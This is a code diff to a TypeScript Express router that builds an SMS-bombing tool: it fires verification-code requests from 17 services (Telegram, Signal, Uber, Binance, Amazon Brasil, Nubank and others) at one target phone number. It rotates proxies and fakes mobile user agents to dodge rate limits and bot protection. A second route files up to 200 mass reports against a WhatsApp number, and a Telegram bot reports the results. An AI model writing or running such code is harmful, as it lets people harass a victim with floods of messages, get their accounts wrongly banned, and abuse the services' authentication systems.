@@ -664,6 +664,72 @@ router.post("/sendcode", async (req, res): Promise<void> => {
       ], 12_000),
     ], r => r.statusCode >= 200 && r.statusCode < 300),
 
+    // ── 13. Signal ────────────────────────────────────────────────────────
+    tryEndpoints("Signal", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-H", "User-Agent: Signal-Android/6.31.3 Android/29",
+        "-H", "X-Signal-Agent: Signal-Android/6.31.3 Android/29",
+        "-H", "Accept: application/json",
+        `https://api2.signal.org/v1/accounts/sms/code/${encodeURIComponent(num.e164)}?client=android&challenge_type=recaptcha`,
+      ], 12_000),
+    ], r => r.statusCode === 200 || r.statusCode === 204),
+
+    // ── 14. Uber ──────────────────────────────────────────────────────────
+    tryEndpoints("Uber", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: Uber/4.492.10001 Android/14",
+        "-H", `x-uber-device-id: ${Math.random().toString(36).slice(2)}`,
+        "--data-raw", JSON.stringify({ phoneNumber: num.e164, countryISOCode: "BR", useCase: "REGISTRATION" }),
+        "https://auth.uber.com/v2/phone/code",
+      ], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.includes('"code":"too_many_requests"')),
+
+    // ── 15. OLX Brasil ────────────────────────────────────────────────────
+    tryEndpoints("OLX", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: OLXBrasil/6.0 Android",
+        "-H", "Accept: application/json",
+        "--data-raw", JSON.stringify({ phone: num.e164 }),
+        "https://auth.olx.com.br/user/phone/send-otp",
+      ], 12_000),
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: OLXBrasil/6.0 Android",
+        "--data-raw", JSON.stringify({ phoneNumber: num.subscriber, areaCode: num.ddd }),
+        "https://api.olx.com.br/accounts/sms-otp",
+      ], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.toLowerCase().includes("incapsula")),
+
+    // ── 16. Binance ───────────────────────────────────────────────────────
+    tryEndpoints("Binance", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: Binance/2.56.0 Android",
+        "-H", "Accept: application/json",
+        "--data-raw", JSON.stringify({ mobile: num.subscriber, mobileCode: `+${num.cc}`, sceneType: "1" }),
+        "https://www.binance.com/bapi/accounts/v2/public/authcenter/send/otp",
+      ], 12_000),
+    ], r => r.statusCode === 200 && r.body.includes('"success":true')),
+
+    // ── 17. Amazon Brasil ─────────────────────────────────────────────────
+    tryEndpoints("Amazon", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded",
+        "-H", "User-Agent: Amazon/24.1.2.800 Android/14",
+        "-H", "Accept: application/json",
+        "--data-raw", `phoneNumber=${encodeURIComponent(num.e164)}&action=resend&requestId=${Math.random().toString(36).slice(2)}`,
+        "https://www.amazon.com.br/ap/ajax/mfa/request_otp",
+      ], 12_000),
+    ], r => r.statusCode === 200 && !r.body.toLowerCase().includes("error")),
+
   ]);
 
   const sent  = results.filter(r => r.status === "sent").length;
@@ -680,6 +746,250 @@ router.post("/sendcode", async (req, res): Promise<void> => {
   });
 
   res.json({ number: num.e164, sent, failed, total: results.length, services: results });
+});
+
+// ── Telegram notification helper ──────────────────────────────────────────────
+async function notifyTelegramChat(chatId: string, html: string): Promise<void> {
+  const token = process.env.TELEGRAM_BOT_TOKEN ?? "";
+  if (!token || !chatId) return;
+  try {
+    await runCurl([
+      "-X", "POST",
+      "-H", "Content-Type: application/json",
+      "--data-raw", JSON.stringify({ chat_id: chatId, text: html, parse_mode: "HTML" }),
+      `https://api.telegram.org/bot${token}/sendMessage`,
+    ], 8_000);
+  } catch { /**/ }
+}
+
+// ── GET /stream/report — SSE real-time progress ───────────────────────────────
+router.get("/stream/report", async (req, res): Promise<void> => {
+  const { number, quantity, userId, chatId } = req.query as Record<string, string>;
+  if (!number) { res.status(400).end(); return; }
+  const num = normaliseNumber(String(number));
+  if (!num) { res.status(400).end(); return; }
+  if (isRateLimited(userId, 50)) {
+    res.writeHead(429, { "Content-Type": "application/json" });
+    res.end(JSON.stringify({ error: "rate_limit" })); return;
+  }
+
+  res.writeHead(200, {
+    "Content-Type":     "text/event-stream",
+    "Cache-Control":    "no-cache, no-store",
+    "Connection":       "keep-alive",
+    "X-Accel-Buffering":"no",
+    "Access-Control-Allow-Origin": "*",
+  });
+
+  const emit = (data: object) => { if (!res.writableEnded) res.write(`data: ${JSON.stringify(data)}\n\n`); };
+  const qty         = Math.min(Math.max(1, parseInt(String(quantity ?? 1), 10)), 200);
+  const CONCURRENCY = Math.min(qty, 10);
+  const indices     = Array.from({ length: qty }, (_, i) => i);
+  let sent = 0, failed = 0;
+
+  emit({ type: "start", number: num.e164, total: qty });
+
+  for (let batch = 0; batch < indices.length; batch += CONCURRENCY) {
+    const slice      = indices.slice(batch, batch + CONCURRENCY);
+    const batchStart = batch;
+    const batchRes   = await Promise.allSettled(slice.map(idx => sendOneReport(num.e164, idx, 3)));
+    for (let i = 0; i < batchRes.length; i++) {
+      const r = batchRes[i]!;
+      const ok  = r.status === "fulfilled" && r.value.ok;
+      const det = r.status === "fulfilled" ? (r.value.detail ?? "") : "error";
+      ok ? sent++ : failed++;
+      emit({ type: "progress", n: batchStart + i + 1, total: qty, ok, detail: det });
+    }
+    if (batch + CONCURRENCY < indices.length) await randDelay(800, 2200);
+  }
+
+  pushHistory({ type: "report", number: num.e164, sent, total: qty, at: Date.now(), userId });
+  emit({ type: "done", sent, failed, total: qty });
+  res.end();
+
+  if (chatId) {
+    await notifyTelegramChat(chatId,
+      `${sent > 0 ? "✅" : "❌"} <b>Report WA concluído</b>\n` +
+      `📱 <code>${num.e164}</code>\n` +
+      `✅ Enviados: <b>${sent}/${qty}</b>  ❌ Falhos: <b>${failed}</b>`
+    );
+  }
+});
+
+// ── GET /stream/sendcode — SSE real-time progress ─────────────────────────────
+router.get("/stream/sendcode", async (req, res): Promise<void> => {
+  const { number, userId, chatId } = req.query as Record<string, string>;
+  if (!number) { res.status(400).end(); return; }
+  const num = normaliseNumber(String(number));
+  if (!num) { res.status(400).end(); return; }
+  if (isRateLimited(userId, 20)) {
+    res.writeHead(429, { "Content-Type": "application/json" });
+    res.end(JSON.stringify({ error: "rate_limit" })); return;
+  }
+
+  res.writeHead(200, {
+    "Content-Type":     "text/event-stream",
+    "Cache-Control":    "no-cache, no-store",
+    "Connection":       "keep-alive",
+    "X-Accel-Buffering":"no",
+    "Access-Control-Allow-Origin": "*",
+  });
+
+  const emit = (data: object) => { if (!res.writableEnded) res.write(`data: ${JSON.stringify(data)}\n\n`); };
+  const sseResults: Array<{ service: string; status: "sent"|"failed" }> = [];
+
+  async function sseService(
+    service: string,
+    endpoints: Array<() => Promise<CurlResult>>,
+    isOk: (r: CurlResult) => boolean
+  ): Promise<void> {
+    for (const fn of endpoints) {
+      try { const r = await fn(); if (isOk(r)) { sseResults.push({ service, status: "sent" }); emit({ type: "service", service, ok: true }); return; } }
+      catch { /**/ }
+    }
+    sseResults.push({ service, status: "failed" }); emit({ type: "service", service, ok: false });
+  }
+
+  // Count services ahead of time for the start event
+  const SERVICE_COUNT = 17;
+  emit({ type: "start", number: num.e164, services: SERVICE_COUNT });
+
+  await Promise.allSettled([
+
+    // ── 1. Telegram ───────────────────────────────────────────────────────────
+    (async () => {
+      const TG_ARGS = [
+        "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded",
+        "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "-H", "X-Requested-With: XMLHttpRequest", "-H", "Origin: https://my.telegram.org",
+        "-H", "Referer: https://my.telegram.org/auth",
+        "--data", `phone=${encodeURIComponent(num.e164)}`,
+        "https://my.telegram.org/auth/send_password",
+      ];
+      const proxies = getAllProxyArgs(); let randomHash = "";
+      for (const proxy of proxies) {
+        try { const r = await runCurl([...proxy, ...TG_ARGS], 12_000); if (r.body.includes("random_hash")) { const m = r.body.match(/"random_hash"\s*:\s*"([^"]+)"/); randomHash = m?.[1] ?? ""; if (randomHash) break; } } catch { /**/ }
+      }
+      if (!randomHash) { try { const r = await runCurl(TG_ARGS, 12_000); if (r.body.includes("random_hash")) { const m = r.body.match(/"random_hash"\s*:\s*"([^"]+)"/); randomHash = m?.[1] ?? ""; } } catch { /**/ } }
+      const ok = !!randomHash; sseResults.push({ service: "Telegram", status: ok ? "sent" : "failed" }); emit({ type: "service", service: "Telegram", ok });
+    })(),
+
+    // ── 2. iFood ─────────────────────────────────────────────────────────────
+    sseService("iFood", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: iFood/25.1.4 Android", "-H", "platform: android", "--data-raw", JSON.stringify({ phone: num.e164 }), "https://marketplace.ifood.com.br/v2/identity/sendCode"], 12_000),
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: iFood/25.1.4 Android", "--data-raw", JSON.stringify({ phone: num.e164, onboardingId: "" }), "https://marketplace.ifood.com.br/v3/identity/request-code"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300),
+
+    // ── 3. Rappi ─────────────────────────────────────────────────────────────
+    sseService("Rappi", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: Rappi/14.5 Android", "-H", "x-country-code: BR", "--data-raw", JSON.stringify({ cellphone: num.subscriber, country_code: num.cc, type: "sms" }), "https://services.rappi.com.br/api/ms/auth/v2/phone-verification/send-code"], 12_000),
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: Rappi/14.5 Android", "--data-raw", JSON.stringify({ phone: num.subscriber, country_code: num.cc }), "https://services.rappi.com.br/api/ms/users-ms/v5/phone/send-otp"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300),
+
+    // ── 4. PicPay ────────────────────────────────────────────────────────────
+    sseService("PicPay", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: PicPay/23.0 Android", "-H", "x-picpay-client: android", "--data-raw", JSON.stringify({ phone: num.e164 }), "https://api.picpay.com/v2/accounts/phone"], 12_000),
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: PicPay/23.0 Android", "--data-raw", JSON.stringify({ cellphone: num.subscriber, countryCode: num.cc }), "https://api.picpay.com/v1/user/phone"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300),
+
+    // ── 5. MercadoLivre ──────────────────────────────────────────────────────
+    sseService("MercadoLivre", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: MELI-Android/9.70.0", "-H", "x-platform: mobile", "--data-raw", JSON.stringify({ phone: num.e164, site_id: "MLB" }), "https://api.mercadolibre.com/users/registrations/phone-verification/send-code"], 12_000),
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: MELI-Android/9.70.0", "--data-raw", JSON.stringify({ phone: num.e164 }), "https://api.mercadolibre.com/users/checkpoints/phone/send_code"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300),
+
+    // ── 6. Shopee ────────────────────────────────────────────────────────────
+    sseService("Shopee", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: Shopee/3.26 Android", "-H", "X-Shopee-Language: pt-BR", "-H", "referer: https://shopee.com.br/user/signup", "--data-raw", JSON.stringify({ phone: `+${num.cc}${num.subscriber}`, support_type: [1], version: 2 }), "https://shopee.com.br/api/v4/user/register/phone_verify"], 12_000),
+    ], r => r.statusCode === 200 && (r.body.includes('"error":0') || r.body.includes('"code":0'))),
+
+    // ── 7. TikTok ────────────────────────────────────────────────────────────
+    sseService("TikTok", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "User-Agent: com.zhiliaoapp.musically/2023130060 (Linux; U; Android 13; pt_BR; Pixel 7; Build/TQ3A.230901.001; Cronet/112.0.5615.136)", "-H", "Content-Type: application/x-www-form-urlencoded", "-H", "Accept-Language: pt-BR", "--data-raw", `account=${encodeURIComponent(num.e164)}&type=0&aid=1233&mix_mode=1&iid=7305723840735675170&device_id=7294823471836275202`, "https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/auth/sms_send/?os_api=29&device_type=Pixel7&build_number=36.1.3"], 12_000),
+    ], r => r.statusCode === 200 && (r.body.includes('"status_code":0') || r.body.includes('"success_sms"'))),
+
+    // ── 8. Nubank ────────────────────────────────────────────────────────────
+    (async () => {
+      try {
+        const disc = await runCurl([...pickProxyArgs(), "-H", "User-Agent: nubank-android-12.0", "-H", "Accept: application/json", "https://prod-global-auth.nubank.com.br/api/discovery"], 10_000);
+        const bodyTrimmed = (disc.body ?? "").trim();
+        let smsUrl = "";
+        if (bodyTrimmed.startsWith("{")) {
+          try { const d = JSON.parse(bodyTrimmed) as Record<string,string>; smsUrl = d["send_sms_challenge"] ?? d["request_code"] ?? ""; } catch { /**/ }
+        }
+        if (smsUrl) {
+          const r = await runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: nubank-android-12.0", "--data-raw", JSON.stringify({ phone_number: num.e164 }), smsUrl], 12_000);
+          const ok = r.statusCode === 200 || r.statusCode === 201; sseResults.push({ service: "Nubank", status: ok ? "sent" : "failed" }); emit({ type: "service", service: "Nubank", ok });
+        } else {
+          const r = await runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: nubank-android-12.0", "--data-raw", JSON.stringify({ phone: num.e164 }), "https://prod-s0-corona.nubank.com.br/api/login"], 10_000);
+          const ok = r.statusCode === 200 || r.statusCode === 201; sseResults.push({ service: "Nubank", status: ok ? "sent" : "failed" }); emit({ type: "service", service: "Nubank", ok });
+        }
+      } catch { sseResults.push({ service: "Nubank", status: "failed" }); emit({ type: "service", service: "Nubank", ok: false }); }
+    })(),
+
+    // ── 9. Zé Delivery ───────────────────────────────────────────────────────
+    sseService("ZeDelivery", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: ZeDelivery/10.0 Android", "--data-raw", JSON.stringify({ phoneNumber: num.e164 }), "https://api.ze.delivery/public-api/v3/identification/send-sms"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.toLowerCase().includes("incapsula")),
+
+    // ── 10. 99Food ───────────────────────────────────────────────────────────
+    sseService("99Food", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: 99food/3.0 Android", "-H", "X-App-Platform: android", "--data-raw", JSON.stringify({ phone: num.e164, country_code: `+${num.cc}` }), "https://api-br.99app.com/v1/passenger/phone/register"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300),
+
+    // ── 11. Kwai ─────────────────────────────────────────────────────────────
+    sseService("Kwai", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: Kwai/10.2.40.573147 Android", "--data-raw", JSON.stringify({ phoneNumber: num.e164, countryCode: `+${num.cc}`, action: "REGISTER", language: "pt" }), "https://rest.kwai.com/rest/n/mab/user/sendVerifyCode"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300 && r.body.length > 2 && !r.body.toLowerCase().includes('"error"')),
+
+    // ── 12. InDrive ──────────────────────────────────────────────────────────
+    sseService("InDrive", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: inDrive/7.0 Android", "--data-raw", JSON.stringify({ phone: num.e164, country_code: num.cc, client_id: "indrive.passenger.android" }), "https://api.indrive.com/auth/v1/otp/send"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300),
+
+    // ── 13. Signal ───────────────────────────────────────────────────────────
+    sseService("Signal", [
+      () => runCurl([...pickProxyArgs(), "-H", "User-Agent: Signal-Android/6.31.3 Android/29", "-H", "X-Signal-Agent: Signal-Android/6.31.3 Android/29", "-H", "Accept: application/json", `https://api2.signal.org/v1/accounts/sms/code/${encodeURIComponent(num.e164)}?client=android&challenge_type=recaptcha`], 12_000),
+    ], r => r.statusCode === 200 || r.statusCode === 204),
+
+    // ── 14. Uber ─────────────────────────────────────────────────────────────
+    sseService("Uber", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: Uber/4.492.10001 Android/14", "-H", "x-uber-device-id: " + Math.random().toString(36).slice(2), "--data-raw", JSON.stringify({ phoneNumber: num.e164, countryISOCode: "BR", useCase: "REGISTRATION" }), "https://auth.uber.com/v2/phone/code"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.includes('"code":"too_many_requests"')),
+
+    // ── 15. OLX Brasil ───────────────────────────────────────────────────────
+    sseService("OLX", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: OLXBrasil/6.0 Android", "-H", "Accept: application/json", "--data-raw", JSON.stringify({ phone: num.e164 }), "https://auth.olx.com.br/user/phone/send-otp"], 12_000),
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: OLXBrasil/6.0 Android", "--data-raw", JSON.stringify({ phoneNumber: num.subscriber, areaCode: num.ddd }), "https://api.olx.com.br/accounts/sms-otp"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.toLowerCase().includes("incapsula")),
+
+    // ── 16. Binance ──────────────────────────────────────────────────────────
+    sseService("Binance", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: Binance/2.56.0 Android", "-H", "Accept: application/json", "--data-raw", JSON.stringify({ mobile: num.subscriber, mobileCode: `+${num.cc}`, sceneType: "1" }), "https://www.binance.com/bapi/accounts/v2/public/authcenter/send/otp"], 12_000),
+    ], r => r.statusCode === 200 && r.body.includes('"success":true')),
+
+    // ── 17. Amazon Brasil ────────────────────────────────────────────────────
+    sseService("Amazon", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-H", "User-Agent: Amazon/24.1.2.800 Android/14", "-H", "Accept: application/json", "--data-raw", `phoneNumber=${encodeURIComponent(num.e164)}&action=resend&requestId=${Math.random().toString(36).slice(2)}`, "https://www.amazon.com.br/ap/ajax/mfa/request_otp"], 12_000),
+    ], r => r.statusCode === 200 && !r.body.toLowerCase().includes("error")),
+
+  ]);
+
+  const sentSse  = sseResults.filter(r => r.status === "sent").length;
+  const failedSse = sseResults.filter(r => r.status === "failed").length;
+
+  pushHistory({ type: "sendcode", number: num.e164, sent: sentSse, total: sseResults.length, at: Date.now(), userId, services: sseResults });
+  emit({ type: "done", sent: sentSse, failed: failedSse, total: sseResults.length });
+  res.end();
+
+  if (chatId) {
+    const lines = sseResults.map(r => `${r.status === "sent" ? "✅" : "❌"} ${r.service}`).join("\n");
+    await notifyTelegramChat(chatId,
+      `${sentSse > 0 ? "📲" : "❌"} <b>SMS Flood concluído</b>\n` +
+      `📱 <code>${num.e164}</code>\n` +
+      `✅ Serviços OK: <b>${sentSse}/${sseResults.length}</b>\n\n${lines.slice(0, 800)}`
+    );
+  }
 });
 
 export default router;
